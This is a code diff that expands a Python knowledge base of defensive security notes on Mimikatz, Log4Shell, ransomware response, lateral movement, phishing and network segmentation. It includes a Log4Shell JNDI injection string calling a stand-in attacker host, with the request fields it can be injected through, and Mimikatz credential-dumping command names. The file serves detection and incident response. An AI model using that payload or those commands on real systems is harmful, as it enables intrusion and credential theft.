@@ -41,39 +41,60 @@ if llm_client:
 
 KNOWLEDGE_BASE = {
     "mimikatz": """
-Mimikatz extracts plaintext passwords and NTLM hashes from Windows LSASS memory.
-Common techniques: sekurlsa::logonpasswords, lsadump::dcsync, kerberos::golden for Golden Ticket attacks.
-Detection: monitor LSASS memory access by non-system processes using Sysmon Event ID 10.
-Unexpected access to lsass.exe from procdump, taskmgr, or unsigned binaries triggers high alerts.
-Mitigations: Credential Guard, disable WDigest, Protected Users group, LSA Protection.
+Mimikatz is a credential dumping tool that extracts plaintext passwords and NTLM hashes
+from Windows LSASS memory. It was created by Benjamin Delpy and is used by both red teams
+and threat actors. Common techniques include sekurlsa::logonpasswords for plaintext creds,
+lsadump::dcsync for domain replication, and kerberos::golden for Golden Ticket attacks.
+
+Detection relies on monitoring LSASS memory access by non-system processes using Sysmon
+Event ID 10. Unexpected access to lsass.exe from tools like procdump, taskmgr, or
+unsigned binaries should trigger high-severity alerts.
+
+Mitigations include enabling Windows Credential Guard, disabling WDigest authentication,
+placing high-value accounts in the Protected Users group, and enabling LSA Protection.
+For active directory environments, enable audit policies for privilege use and account
+management, and baseline normal dcsync behaviour to detect unauthorized replication.
 """,
     "log4shell": """
-CVE-2021-44228 Log4Shell is a critical RCE in Apache Log4j2 versions 2.0-beta9 through 2.14.1.
-Attack vector: inject ${jndi:ldap://attacker.com/x} into any logged field.
+CVE-2021-44228 Log4Shell is a critical RCE vulnerability in Apache Log4j2 versions 2.0-beta9 through 2.14.1.
+Attack vector: inject ${jndi:ldap://attacker.com/x} into any logged HTTP field.
+Exploitable via User-Agent, X-Forwarded-For, or any parameter that gets logged.
 No authentication required; CVSS score 10.0.
-Remediation: upgrade to Log4j 2.17.1. Detection: outbound LDAP, jndi patterns in web logs.
+Remediation: upgrade to Log4j 2.17.1 or later.
+Mitigation: set -Dlog4j2.formatMsgNoLookups=true.
+Detection: outbound LDAP from application servers; jndi patterns in web access logs.
 """,
     "ransomware": """
-Ransomware incident response phases:
-Phase 1 (0-30 min): confirm indicators, find Patient Zero, do NOT reboot.
-Phase 2: isolate via VLAN, disable accounts, block C2.
-Phase 3: remove persistence, reset credentials, patch initial access vector.
-Phase 4: restore from clean backups, monitor for re-infection.
+Ransomware incident response: Phase 1 (0-30 min) confirm indicators and identify Patient Zero.
+Do NOT reboot infected machines — memory forensics may be needed.
+Phase 2 (30 min to 2 hr): isolate via VLAN not shutdown, disable compromised accounts, block C2 at perimeter.
+Phase 3 (2-24 hr): remove persistence mechanisms, reset all credentials, patch initial access vector.
+Phase 4 (1-7 days): restore from clean backups, prioritise critical systems, monitor for re-infection.
+Phase 5: root cause analysis, update detection rules, test backup integrity.
 """,
     "lateral_movement": """
-Lateral movement detection: SMB anomalies (Event 4624 type 3), unusual RDP, PsExec/WMI execution.
-Pass-the-Hash reuses NTLM hashes. Baseline admin behaviour to detect anomalies.
-Alert when admin tools appear on non-admin workstations.
+Lateral movement allows attackers to progressively move through a network after initial compromise.
+Detect via SMB authentication anomalies (Event ID 4624 type 3), unusual RDP connections.
+PsExec and WMI remote execution are common lateral movement tools; monitor process creation.
+Pass-the-Hash attacks reuse NTLM hashes without knowing plaintext passwords.
+Baseline normal admin behaviour to distinguish legitimate from malicious activity.
+Alert on admin tools appearing on non-admin workstations.
 """,
     "phishing": """
-Identify phishing by checking SPF/DKIM/DMARC, sender domain age, and URL redirect chains.
-Hash attachments and check VirusTotal. Sandbox unknown executables.
-Spear-phishing uses OSINT; BEC uses lookalike domains and urgency.
+Phishing emails impersonate trusted entities to steal credentials or deliver malware.
+Identify phishing by checking SPF, DKIM, and DMARC alignment in email headers.
+Inspect sender domain age and URL redirect chains for suspicious redirects.
+Hash attachments and check against VirusTotal; sandbox unknown executables.
+Spear-phishing targets specific individuals using OSINT from LinkedIn and social media.
+Business Email Compromise (BEC) uses lookalike domains and urgency to bypass scrutiny.
 """,
     "network_segmentation": """
-Segment: DMZ for internet-facing services, separate VLAN for OT/ICS, isolated network for DCs.
-Zero-trust: verify every request, assume breach. Microsegmentation limits east-west traffic.
-Document all segment boundaries and authorised communication paths.
+Network segmentation limits lateral movement by dividing infrastructure into isolated zones.
+DMZ hosts internet-facing services; separate VLAN for OT and ICS systems; isolated network for domain controllers.
+Zero-trust architecture verifies every request and assumes breach at all times.
+Microsegmentation uses host-based firewall rules to restrict east-west traffic.
+VLAN-based segmentation is fast to implement; SDN-based microsegmentation scales better.
+Document all segment boundaries and authorised communication paths in a network diagram.
 """,
 }
 
